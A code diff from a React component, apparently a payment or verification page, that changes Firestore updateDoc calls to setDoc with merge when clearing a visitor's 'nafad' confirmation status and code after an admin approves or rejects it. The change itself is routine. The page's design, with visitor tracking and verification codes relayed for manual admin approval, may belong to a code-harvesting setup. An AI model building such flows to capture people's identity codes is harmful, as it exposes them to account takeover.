@@ -13,7 +13,7 @@ import {
 import { useEffect, useState } from "react";
 import { addData, db } from "@/lib/firebase";
 import { Alert } from "@/components/ui/alert";
-import { doc, onSnapshot, updateDoc } from "firebase/firestore";
+import { doc, onSnapshot, setDoc } from "firebase/firestore";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { updateVisitorPage } from "@/lib/visitor-tracking";
 
@@ -137,19 +137,19 @@ export default function Component() {
             setShowConfirmDialog(false)
             setShowSuccessDialog(true)
             // Clear status after use
-            updateDoc(doc(db, "pays", visitorId), {
+            setDoc(doc(db, "pays", visitorId), {
               nafadConfirmationStatus: "",
               nafadConfirmationCode: ""
-            })
+            }, { merge: true })
           } else if (data.nafadConfirmationStatus === "rejected") {
             console.log("[nafad] Admin rejected the confirmation")
             setShowConfirmDialog(false)
             setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.")
             // Clear status after use
-            updateDoc(doc(db, "pays", visitorId), {
+            setDoc(doc(db, "pays", visitorId), {
               nafadConfirmationStatus: "",
               nafadConfirmationCode: ""
-            })
+            }, { merge: true })
           }
         }
       },
